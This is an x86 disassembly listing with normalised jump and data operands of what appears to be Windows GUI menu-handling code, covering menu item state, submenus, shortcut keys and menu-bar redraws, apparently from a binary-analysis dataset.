mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44911c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44911c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44a35c
test al al
je r-xdata
mov eax esi
call sub_44911c
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44912c
call sub_44a1b4
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44912c
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44912c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44912c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44912c
call sub_44a1b4
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44912c
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44912c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44912c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44912c
call sub_44a1b4
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44a330
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44a330
and eax 0x7f
mov al [ eax + rw-data ]
sub_44a35c
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44a35c
and eax 0x7f
mov al [ eax + rw-data ]
sub_44a388
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447070
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41a944
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44b0b4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44a424
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403294
mov eax [ esi + 0x44 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_44a498
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44a498
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_446bdc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_449520
mov eax ebx
pop esi
pop ebx
retn
sub_44a4d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44911c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44912c
call sub_44a4d8
pop ecx
test al al
je r-xdata
sub_44a570
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44a4d8
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_446bdc
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44a5a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44a570
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44b8c4
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44a610
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44a570
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44a62c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44a570
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_449cdc
mov ebx eax
xor edx edx
mov eax edi
call sub_44a1d8
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_449644
mov eax [ esi + 0x34 ]
call sub_449644
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_447580
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call DrawMenuBar
sub_44a718
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44a718
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_44a83d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44a570
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_449644
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44a708
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44a86c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4234f4
xor eax eax
push ebp
push sub_44a96a
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4234f4
xor eax eax
push ebp
push sub_44a93f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44a718
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4234ec
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a971
mov eax [ rw-data ]
call sub_4234ec
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44a570
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44a990
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44ad14
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44ad14
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44aa4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44afe8
mov eax ebx
call sub_408620
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44aaec
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44aa4c
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4042c0
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404510
lea edx [ ebp - 0x200 ]
call sub_408710
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44ab80
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_44abf0
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44b090
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44b090
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44b090
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44abfc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44aaec
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44ab80
mov eax ebx
call sub_44b0b4
jmp r-xdata
sub_44ac64
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44acac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_444edc
mov eax ebx
call sub_44a4c0
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_444f20
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41aa14
sub_44ace8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ac60
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44acac
sub_44ad2c
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a570
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44a570
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44e038
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44ad88
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_44ae5d
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a570
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a570
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44911c
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44912c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404238
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404238
mov eax [ ebp - 0xc ]
pop edx
call sub_407da4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44bbd4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae64
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404074
retn
sub_44ae70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44ad2c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44ad88
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44afe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44a6f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44a570
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44a570
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4086f0
mov eax [ ebp + 0x10 ]
call sub_408608
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44b0b4
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43468c
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b090
mov [ ebx + 0x41 ] 0x1
sub_44b0dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b090
mov [ ebx + 0x41 ] 0x1
sub_44b168
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44ac64
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44aaec
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44b1f8
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44b234
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b25e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b280
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b7b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7ba
lea eax [ ebp - 0x30 ]
call sub_404050
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ esi + 0x4 ]
call sub_44a62c
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_457648
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov dx [ esi + 0x4 ]
call sub_44a610
test al al
